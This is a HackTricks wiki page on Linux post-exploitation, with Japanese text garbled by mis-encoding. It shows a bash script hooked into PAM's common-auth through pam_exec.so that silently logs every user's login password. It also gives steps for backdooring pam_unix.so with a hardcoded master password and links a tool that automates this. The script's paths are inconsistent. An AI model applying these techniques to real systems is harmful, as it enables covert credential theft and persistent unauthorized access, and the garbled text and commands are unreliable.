# Linux Post-Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## PAMã‚’ä½¿ç”¨ã—ãŸãƒ­ã‚°ã‚¤ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã«ä½¿ç”¨ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ­ã‚°ã«è¨˜éŒ²ã™ã‚‹ãŸã‚ã«PAMãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è¨­å®šã—ã¾ã—ã‚‡ã†ã€‚PAMãŒä½•ã‹åˆ†ã‹ã‚‰ãªã„å ´åˆã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**è©³ç´°ã«ã¤ã„ã¦ã¯ã€[å…ƒã®æŠ•ç¨¿](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)ã‚’ç¢ºèªã—ã¦ãã ã•ã„**ã€‚ã“ã‚Œã¯è¦ç´„ã§ã™ï¼š

**æŠ€è¡“æ¦‚è¦ï¼š**
ãƒ—ãƒ©ã‚¬ãƒ–ãƒ«èªè¨¼ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆPAMï¼‰ã¯ã€Unixãƒ™ãƒ¼ã‚¹ã®ã‚·ã‚¹ãƒ†ãƒ ã§ã®èªè¨¼ç®¡ç†ã«æŸ”è»Ÿæ€§ã‚’æä¾›ã—ã¾ã™ã€‚ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã™ã‚‹ã“ã¨ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã§ãã¾ã™ãŒã€èª¤ç”¨ã•ã‚Œã‚‹ã¨ãƒªã‚¹ã‚¯ã‚‚ä¼´ã„ã¾ã™ã€‚ã“ã®è¦ç´„ã§ã¯ã€PAMã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³è³‡æ ¼æƒ…å ±ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹æŠ€è¡“ã¨ã€ãã®ç·©å’Œæˆ¦ç•¥ã‚’æ¦‚èª¬ã—ã¾ã™ã€‚

**è³‡æ ¼æƒ…å ±ã®ã‚­ãƒ£ãƒ—ãƒãƒ£ï¼š**
- `toomanysecrets.sh`ã¨ã„ã†åå‰ã®bashã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒä½œæˆã•ã‚Œã€ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œã‚’è¨˜éŒ²ã—ã€æ—¥ä»˜ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åï¼ˆ`$PAM_USER`ï¼‰ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆstdinçµŒç”±ï¼‰ã€ãŠã‚ˆã³ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆIPï¼ˆ`$PAM_RHOST`ï¼‰ã‚’`/var/log/toomanysecrets.log`ã«ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚
- ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯å®Ÿè¡Œå¯èƒ½ã«ã•ã‚Œã€`pam_exec.so`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦PAMæ§‹æˆï¼ˆ`common-auth`ï¼‰ã«çµ±åˆã•ã‚Œã€é™ã‹ã«å®Ÿè¡Œã—ã€èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«å…¬é–‹ã™ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒä»˜ä¸ã•ã‚Œã¾ã™ã€‚
- ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ä¾µå®³ã•ã‚ŒãŸLinuxãƒ›ã‚¹ãƒˆãŒè³‡æ ¼æƒ…å ±ã‚’å¯†ã‹ã«è¨˜éŒ²ã™ã‚‹ãŸã‚ã«ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã•ã‚Œã‚‹ã‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**è©³ç´°ã«ã¤ã„ã¦ã¯ã€[å…ƒã®æŠ•ç¨¿](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)ã‚’ç¢ºèªã—ã¦ãã ã•ã„**ã€‚ã“ã‚Œã¯è¦ç´„ã§ã™ï¼š

ãƒ—ãƒ©ã‚¬ãƒ–ãƒ«èªè¨¼ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆPAMï¼‰ã¯ã€Linuxã§ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚ã“ã‚Œã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã€ãŠã‚ˆã³**ã‚µãƒ¼ãƒ“ã‚¹**ã®3ã¤ã®ä¸»è¦ãªæ¦‚å¿µã«åŸºã¥ã„ã¦å‹•ä½œã—ã¾ã™ã€‚å„ã‚µãƒ¼ãƒ“ã‚¹ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯`/etc/pam.d/`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚Šã€å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒèªè¨¼ã‚’å‡¦ç†ã—ã¾ã™ã€‚

**ç›®çš„**ï¼šç‰¹å®šã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§èªè¨¼ã‚’è¨±å¯ã™ã‚‹ã‚ˆã†ã«PAMã‚’å¤‰æ›´ã—ã€å®Ÿéš›ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰æ¤œè¨¼ã®ãŸã‚ã«ã»ã¼ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã«å«ã¾ã‚Œã¦ã„ã‚‹`common-auth`ãƒ•ã‚¡ã‚¤ãƒ«ã§ä½¿ç”¨ã•ã‚Œã‚‹`pam_unix.so`å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ç‰¹ã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã¾ã™ã€‚

### `pam_unix.so`ã®å¤‰æ›´æ‰‹é †ï¼š

1. **`common-auth`ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®èªè¨¼ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ç‰¹å®š**ï¼š
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç¢ºèªã™ã‚‹è²¬ä»»ãŒã‚ã‚‹è¡Œã¯`pam_unix.so`ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚
2. **ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´**ï¼š
- `pam_unix_auth.c`ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ã«ã€äº‹å‰å®šç¾©ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚ŒãŸå ´åˆã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹æ¡ä»¶æ–‡ã‚’è¿½åŠ ã—ã€ãã†ã§ãªã„å ´åˆã¯é€šå¸¸ã®èªè¨¼ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç¶šè¡Œã—ã¾ã™ã€‚
3. **å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦**ã€é©åˆ‡ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å¤‰æ›´ã•ã‚ŒãŸ`pam_unix.so`ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç½®ãæ›ãˆã¾ã™ã€‚
4. **ãƒ†ã‚¹ãƒˆ**ï¼š
- äº‹å‰å®šç¾©ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã•ã¾ã–ã¾ãªã‚µãƒ¼ãƒ“ã‚¹ï¼ˆãƒ­ã‚°ã‚¤ãƒ³ã€sshã€sudoã€suã€ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚»ãƒ¼ãƒãƒ¼ï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã€é€šå¸¸ã®èªè¨¼ãƒ—ãƒ­ã‚»ã‚¹ã«ã¯å½±éŸ¿ãŒã‚ã‚Šã¾ã›ã‚“ã€‚

{% hint style="info" %}
ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)ã§è‡ªå‹•åŒ–ã§ãã¾ã™
{% endhint %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
